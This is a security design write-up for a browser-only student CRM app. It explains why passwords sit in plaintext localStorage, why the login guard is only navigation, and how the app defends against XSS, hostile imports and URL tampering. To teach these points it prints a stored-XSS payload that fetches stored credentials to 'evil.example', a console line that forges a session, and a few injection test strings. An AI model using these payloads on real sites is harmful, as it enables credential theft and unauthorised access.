# Security in 10X CRM — every decision, and why

This app stores passwords in readable text and its login screen can be walked
straight past with the browser's developer tools. Both of those are true, both
are deliberate, and this file explains why — and what a real product does
instead.

It is written for someone who wants to *understand* the reasoning, not just
recite it. Each section is: **the decision**, **why it is like that here**, and
**what changes when there is a server**.

---

## 0. The rule everything follows from

The assignment specifies **no backend**. No server, no database, no API of our
own — one folder of HTML, CSS and JavaScript, plus a public practice API for the
client list. Everything the app remembers lives in `localStorage`, in the
visitor's own browser.

That single rule decides almost every security question below, because it means:

> **All of the code, and all of the data, is on the attacker's computer.**

Not "could be reached by" — *is*. The person using the browser owns the
JavaScript, owns the storage, and can read and change both. Any rule the app
enforces, it enforces on a machine the attacker controls.

Once you accept that, the security decisions stop being a list of things to
remember and become obvious consequences of one fact.

---

## 1. Passwords are stored in readable text

**Where:** `js/storage.js` — the `crm_users` key.

Open DevTools → Application → Local Storage and you can read every registered
password. There is no way to make that untrue in this app.

### Why not hash them?

The instinct is to hash the password before storing it, so the stored value is
not the password itself. Here that would be **theatre**, not security:

- Hashing has to happen in JavaScript this app ships.
- An attacker reading `crm_users` is already reading that same JavaScript.
- So they can run the same hash on any guess, in the same browser, for free.

Worse, it would create a **false hashed password**: the stored hash *becomes*
the credential, because the login check compares a hash to a hash. Anyone who
can edit `localStorage` can paste a hash they generated and log in as anyone.
Hashing would have made the app *look* more secure while changing nothing about
who can get in.

There is a deeper point, and it is the one worth saying at an exam:

> Hashing protects a password **at rest on a server** against someone who
> stole the database but cannot run your login code as you. None of those
> conditions exist in a browser-only app.

### What a real product does

- The password never reaches storage in a readable form because it never
  *reaches the browser's storage at all*. It is sent once, over HTTPS, to a
  server.
- The server stores a **slow, salted hash** — bcrypt, scrypt or Argon2. Slow on
  purpose: a fast hash lets an attacker with the stolen database try billions of
  guesses a second, and a deliberately slow one cuts that to thousands.
- The **salt** is a random value stored beside each hash, so two people with the
  same password get different hashes and one cracked password does not unlock
  every account that shares it.
- The browser then holds only a **session token** — a random string that proves
  "someone logged in as this user", which the server can revoke at any time and
  which is worthless on any other site.

---

## 2. The login guard is navigation, not security

**Where:** `js/app.js` — `PROTECTED_PAGES` and the redirect.

Open `dashboard.html` without logging in and the page bounces you to the login
screen. That is a real feature and it is worth having. It is **not** access
control, and it is important to say so plainly rather than to imply otherwise.

Anyone can defeat it in about five seconds:

```js
// typed into the console on the login page
localStorage.setItem('crm_session', JSON.stringify({ userId: 1 }));
```

...and the guard now lets them in, because the guard's only question is "is
there a session object in storage?" and they just wrote one.

### So why have it at all?

Because it does a genuinely useful job: it keeps the app **coherent**. A logged
-out visitor should not land on a dashboard full of blank statistics. It
prevents accidents and confusion, which is most of what happens in practice.

It is a *routing* feature wearing a security-shaped hat, and the honest framing
is: it stops people who are not trying, and only people who are not trying.

### One thing the guard does get right

`window.location.href = '...'` starts a navigation — it does **not** stop the
current page. The browser keeps parsing and running every script after it. So
early versions of this app redirected an unauthenticated visitor *and* ran the
whole clients page on the way out: a real API request, thirty clients written
into storage, and the full list rendered into a page the visitor was not
allowed to see.

The guard now publishes `isRedirecting`, and every page script checks it before
doing anything. That is not defence against an attacker, but it *is* a real bug
fix — the page genuinely was doing work it should not have.

### What a real product does

The check lives on the **server**, on every request, for every piece of data —
not once at the door. The browser's copy of the check exists only to make the
interface behave sensibly; the server never trusts it. The rule is:

> Anything the client sends, including "I am logged in", is a **claim**, not a
> fact. The server decides.

---

## 3. Cross-site scripting — the one place this app defends something real

**Where:** everywhere the app puts text on the page. `js/clients.js`,
`js/profile.js`, `js/analytics.js`, `js/ui.js`.

This is the section to pay attention to, because unlike the two above, **this
defence is genuine and it matters even without a server.**

### The attack

Client names, company names and notes are free text. Suppose someone saves a
client called:

```
<img src=x onerror="fetch('https://evil.example/steal?d='+localStorage.crm_users)">
```

If the app built its HTML by pasting that into a string:

```js
card.innerHTML = '<div class="name">' + client.name + '</div>';   // NEVER
```

...then the browser would not see a name. It would see an `<img>` tag, fail to
load `x`, run the `onerror` handler, and send every stored account — including
the readable passwords from section 1 — to someone else's server.

And because the client list is **saved**, it would do that again on every future
visit, and for anyone else who opens that record. That is called **stored XSS**,
and it is the worst variety precisely because it persists.

### The defence

Every piece of text in this app is put on the page with `textContent`, and every
element is built with `createElement`:

```js
const name = document.createElement('div');
name.className = 'client-card__name';
name.textContent = client.name;      // characters, not markup
```

`textContent` tells the browser *"this is text to display"*. There is no parsing
step, so there is nothing to inject into. The malicious name above renders as
those literal characters, visibly and harmlessly, which is exactly right.

**There is no `innerHTML` anywhere in this project.** That is checked, not
assumed.

### The escaping trap, if you ever do need a string

`js/ui.js` has an `escapeHtml()` helper that replaces all five characters —
`&`, `<`, `>`, `"` and `'`. The obvious shortcut is to let the browser do it:

```js
const div = document.createElement('div');
div.textContent = value;
return div.innerHTML;      // looks clever, is broken
```

That only escapes `&`, `<` and `>`, because quotes are not special in ordinary
text. So it leaves this wide open:

```html
<img alt="${escapeHtml(name)}">
```

with a name of `" onerror="alert(1)`. There is no `&`, `<` or `>` in it at all,
the shortcut returns it untouched, the quote closes the `alt` attribute, and the
injected handler becomes real. Escaping the quotes is what closes it.

### What a real product does

The same thing, plus two more layers:

- A **Content-Security-Policy** header, so even if a script were injected the
  browser would refuse to run it.
- **Sanitising on the way in** as well as escaping on the way out, so hostile
  content never reaches the database at all.

---

## 4. The import file is untrusted input

**Where:** `js/analytics.js` — `sanitizeImportedClient()` and `safeImageValue()`.

The analytics page can load a `.json` file back into the CRM. That is the one
place in this app where **a document written by someone else becomes application
data**, so it is treated as hostile by default. Nothing from the file is used as
it arrives:

| Field | What is done | Why |
|---|---|---|
| `id` | **thrown away and reassigned** | A file with two clients sharing an id would make deleting one delete both |
| `name` | `String()`, and the record is dropped if empty | A name that is an object or an array would break every render |
| `dealValue` | `Number()` + a finite check, else `0` | `"abc"` would poison every total on the dashboard as `NaN` |
| `status` | must be one of the four, else the default | An unknown stage would render a badge with no colour and break filtering |
| `image`, `avatar` | must match `data:image/...` or `https://` | **See below** |
| `closedAt` | dropped unless the deal is actually closed | A file could otherwise describe an open deal that had already finished |

### Why the image fields get their own rule

Those strings end up in an `<img src>`. Restricting them to real image data URLs
and `https://` means a hand-edited file cannot smuggle in a `javascript:` URL or
a `data:text/html` document and get the app to render it.

This is the same principle as section 3 in a different costume: **decide what is
allowed and reject everything else**, rather than trying to list what is
dangerous. A blocklist is a bet that you thought of every attack; an allowlist
is not.

### What a real product does

Exactly this, on the **server**, before anything is written to the database —
plus a size limit, a rate limit, and a virus scan if the file could be anything
other than JSON.

---

## 5. The export deliberately leaves things out

**Where:** `js/analytics.js` — `handleExport()`.

The export contains your clients and your name and company. It does **not**
contain your password, and it does not contain your email address.

The reasoning is about what happens to the file afterwards. A backup is exactly
the kind of thing people mail to themselves, drop in cloud storage, or hand to a
colleague. Writing the password into it would take a weakness that is *local* —
section 1, readable only by someone already at your computer — and make it
**portable**. A file that travels is a much bigger problem than a storage key
that does not.

> The general lesson: **data becomes more dangerous when it moves.** Ask what an
> export is for, and include only that.

---

## 6. URL parameters are untrusted too

**Where:** `js/clients.js` — `openClientFromUrl()`.

RONIN's advice ends in a button that opens a specific client, which works by
navigating to `clients.html?client=12`. Anyone can type anything after
`client=`, so that value is untrusted input in exactly the way a form field is.

It is never used to build markup, and never dropped into a CSS selector. It is
converted to a number and matched against ids the app already has:

```js
const id = Number(wanted);
if (!Number.isFinite(id)) return;
const client = clients.find((item) => item.id === id);
if (!client) return;
```

An id that does not exist simply does nothing, which is also the right behaviour
for an ordinary stale bookmark. There is a test that visits
`clients.html?client=<img src=x onerror=alert(1)>` and checks nothing happens.

### The near miss worth knowing about

Elsewhere in the same file, a client id **is** interpolated into a selector:

```js
listEl.querySelector(`.client-card[data-id="${Number(client.id)}"]`)
```

That is safe only because of the `Number()` around it, which can produce nothing
but a numeric literal, `NaN` or `Infinity` — none of which can break out of the
attribute selector. Without it, a crafted id containing a quote could change
which elements the selector matched. Same shape of bug as SQL injection, same
fix: **never build a query out of raw input.**

---

## 7. Photo uploads are re-encoded, not stored

**Where:** `js/ui.js` — `readImageAsAvatar()`.

An uploaded photo is never stored as the file that arrived. It is decoded into
an `<img>`, drawn onto a canvas at 128×128, and re-encoded as a JPEG. What ends
up in storage is an image **this app produced**.

The main reason is size — `localStorage` holds about 5 MB and a phone photo is
3–5 MB — but there is a security side effect worth understanding: re-encoding
through a canvas discards everything that was not pixels. Metadata goes,
including any GPS coordinates the camera recorded, and so does anything hiding
in the file that was never really image data.

`file.type` is checked as well, which is a *courtesy* check rather than a
defence: the type comes from the browser's guess and can be wrong. The real
protection is that a file which is not an image simply fails to decode, and the
upload is rejected with a message.

### What a real product does

The same re-encode, on the server, plus a check of the file's actual leading
bytes rather than its claimed type, and a hard size limit enforced before the
upload is accepted rather than after.

---

## 8. What this app gets right that has nothing to do with servers

Not everything above is an apology. These are genuine and would survive
unchanged into a real product:

- **The generic login error.** `Invalid email or password` never says which one
  was wrong. Saying "no account with that email" turns the login form into a
  tool for discovering who is registered.
- **`confirm()` on destructive actions only.** Delete a client and reset the CRM
  ask first. Nothing else interrupts you, so the interruption still means
  something.
- **Logout clears the session and nothing else.** Logging out is not deleting
  your data, and conflating the two loses people's work.
- **The export omits credentials**, as in section 5.
- **The import allowlists**, as in section 4.
- **No `innerHTML` anywhere**, as in section 3.

---

## The summary table

| # | Decision | Real security here? | What a server changes |
|---|---|---|---|
| 1 | Passwords in readable text | **No** | Slow salted hash on the server; browser holds only a revocable token |
| 2 | Login guard in JavaScript | **No** | Server checks every request; client check is only for tidy navigation |
| 3 | `textContent`, never `innerHTML` | **Yes** | Same, plus a Content-Security-Policy header |
| 4 | Import allowlisting | **Yes** | Same, on the server, before the database |
| 5 | Export omits credentials | **Yes** | Same |
| 6 | URL parameters coerced to numbers | **Yes** | Same, plus server-side authorisation on the record |
| 7 | Photos re-encoded via canvas | **Yes** (side effect) | Same, plus magic-byte checks and a size limit |

**The one-line version, if you are asked in an exam:**

> Two of these are honest limitations forced by having no backend, and I can
> explain exactly why working around them in the browser would be theatre. The
> rest are real defences that would still be real with a server behind them.
